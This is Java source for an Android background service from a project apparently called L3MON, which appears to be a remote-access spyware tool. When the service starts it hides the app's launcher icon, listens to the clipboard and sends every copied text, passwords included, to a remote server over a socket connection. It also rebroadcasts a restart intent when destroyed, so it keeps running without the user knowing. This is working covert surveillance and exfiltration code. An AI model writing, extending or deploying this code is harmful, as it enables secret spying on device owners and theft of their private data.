package com.etechd.l3mon;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Timer;
import java.util.TimerTask;

public class MainService extends Service {
    private static Context contextOfApplication;

    public MainService() {

    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        //throw new UnsupportedOperationException("Not yet implemented");
        return null;
    }

    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
        // Hide App Icon
        PackageManager pkg=this.getPackageManager();
        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);



        ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            public void onPrimaryClipChanged() {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (clipboard.hasPrimaryClip()) {
                ClipData clipData = clipboard.getPrimaryClip();
                if (clipData.getItemCount() > 0) {
                    CharSequence text = clipData.getItemAt(0).getText();
                    if (text != null) {
                        try {
                            JSONObject data = new JSONObject();
                            data.put("text", text);
                            IOSocket.getInstance().getIoSocket().emit("0xCB" , data);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
            }
        };

        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);


        contextOfApplication = this;
        ConnectionManager.startAsync(this);
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sendBroadcast(new Intent("respawnService"));
    }

    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }

}
